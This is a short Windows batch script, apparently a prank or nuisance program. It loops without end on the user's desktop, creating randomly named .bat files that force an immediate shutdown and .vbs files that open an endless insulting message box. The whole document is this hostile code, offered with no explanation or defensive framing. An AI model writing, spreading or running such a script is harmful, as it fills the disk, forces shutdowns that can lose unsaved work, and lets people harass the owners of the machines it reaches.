@echo off
cd %USERPROFILE%\desktop
:a
echo shutdown /f /s /t 0 >> %random%%random%%random%%random%%random%%random%.bat
echo do : msgbox("you dumbass") : loop >> %random%%random%%random%%random%%random%%random%.vbs
goto a